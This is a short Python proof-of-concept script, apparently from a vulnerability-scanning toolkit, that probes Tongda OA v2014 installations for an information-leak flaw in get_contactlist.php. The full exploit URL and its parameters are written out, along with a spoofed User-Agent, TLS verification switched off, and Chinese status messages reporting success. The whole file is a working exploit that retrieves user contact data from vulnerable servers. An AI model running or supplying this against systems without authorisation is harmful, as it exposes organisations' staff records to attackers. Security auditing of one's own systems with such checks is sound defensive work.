import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = target_url + 'mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3'
    print(now_time() + " [INFO]     正在检测通达OA v2014 get_contactlist敏感信息泄漏漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200 and 'user' in response.text:
            print(now_time() + ' [SUCCESS]  存在通达OA v2014 get_contactlist敏感信息泄漏漏洞:{}'.format(exp_url))
        else:
            print(now_time() + " [WARNING]  不存在通达OA v2014 get_contactlist敏感信息泄漏漏洞")
    except:
        print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在或被拒绝访问')
